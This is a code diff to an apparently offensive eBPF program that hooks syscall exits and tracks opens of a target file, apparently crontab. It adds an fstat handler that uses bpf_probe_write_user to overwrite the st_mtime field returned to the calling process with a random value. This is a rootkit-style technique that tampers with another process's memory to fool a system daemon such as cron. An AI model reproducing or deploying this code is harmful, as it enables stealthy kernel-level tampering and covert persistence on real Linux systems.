@@ -43,7 +43,7 @@ static __inline int handle_exit_openat(struct pt_regs *regs,unsigned long ret,un
 static __inline int handle_exit_read(struct pt_regs *regs,unsigned long ret,unsigned int pid);
 static __inline int handle_exit_close(struct pt_regs *regs,unsigned long ret,unsigned int pid);
 static __inline int handle_exit_newfstatat(struct pt_regs *regs,unsigned long ret,unsigned int pid);
-
+static __inline int handle_exit_fstat(struct pt_regs *regs,unsigned long ret,unsigned int pid);
 
 static __inline int memcmp(const void* s1, const void* s2, size_t cnt);
 
@@ -67,17 +67,20 @@ int raw_tp_sys_exit(struct bpf_raw_tracepoint_args *ctx)
 	return 0;
   switch (syscall_id)
     {
-		case 0:
-			handle_exit_read(regs,ret,pid);
-			break;
-		case 3:
-			handle_exit_close(regs,ret,pid);
-			break;
+		//case 0:
+		//	handle_exit_read(regs,ret,pid);
+		//	break;
+//		case 3:
+//			handle_exit_close(regs,ret,pid);
+//			break;
+                case 5:
+                        handle_exit_fstat(regs,ret,pid);
+                        break;
 		case 257:
-            handle_exit_openat(regs,ret,pid);
-            break;
-		case 262:
-			handle_exit_newfstatat(regs,ret,pid);
+                        handle_exit_openat(regs,ret,pid);
+                        break;
+//		case 262:
+//			handle_exit_newfstatat(regs,ret,pid);
 	}
 }
 
@@ -89,7 +92,7 @@ static __inline int handle_exit_openat(struct pt_regs *regs,unsigned long ret,un
 	char buf[0x40];
 	//读文件名，这里VSCODE会给这一行报错，看来果真还是不够行
 	bpf_probe_read_str(buf,sizeof(buf), ((char *)PT_REGS_PARM2_CORE(regs)));
-	//bpf_printk("exit_openat %s:%d fd:%d\n",buf,pid,retfd);
+	bpf_printk("exit_openat %s:%d fd:%d\n",buf,pid,retfd);
 	//如果文件名不匹配我们感兴趣的文件名就不做了睡大觉
 	if (memcmp(buf, INTERESTING_FILENAME, sizeof(INTERESTING_FILENAME)))
 		return 0;
@@ -180,6 +183,42 @@ static __inline int handle_exit_newfstatat(struct pt_regs *regs,unsigned long re
 		bpf_probe_write_user(&(statbuf_ptr->st_mtime), &crontab_st_mtime, sizeof(crontab_st_mtime));
 	}
 
+}
+
+static __inline int handle_exit_fstat(struct pt_regs *regs,unsigned long ret,unsigned int pid)
+{
+        struct stat statbufobj;
+        int thisistarget=0;
+
+        //读dirfd, 看对象是否是目标文件
+        unsigned int dirfd=PT_REGS_PARM1_CORE(regs);
+        struct pidandfd pidfd={.pid=pid, .fd=dirfd};
+        unsigned int* exists=bpf_map_lookup_elem(&map_fds, &pidfd);
+        if(exists!=NULL && *exists==1)
+        {
+                thisistarget=1;
+                bpf_printk("yes,target! method:open->fstat\n");
+        }
+
+        if(!thisistarget)
+        {
+                bpf_printk("exit_fstat:not target\n");
+                return 0;
+        }
+
+        if(thisistarget)
+        {
+                struct stat *statbuf_ptr=PT_REGS_PARM2_CORE(regs);
+                bpf_printk("exit_fstat %d:%d\n",dirfd,pid);
+
+                //bpf_probe_read_user(&statbufobj,sizeof(statbufobj), PT_REGS_PARM2_CORE(regs));
+                //bpf_printk("target statbuf.st_size:%ld\n",statbufobj.st_size);
+                //修改statbuf时间mtime字段
+                __kernel_ulong_t crontab_st_mtime = bpf_get_prandom_u32() % 0xfffff;
+                bpf_printk("Time MaGic %d+1s!\n",crontab_st_mtime);
+                bpf_printk("mtime:%d\n",&(statbuf_ptr->st_mtime));
+                bpf_probe_write_user(&(statbuf_ptr->st_mtime), &crontab_st_mtime, sizeof(crontab_st_mtime));
+        }
 }
 char LICENSE[] SEC("license") = "Dual BSD/GPL";
 
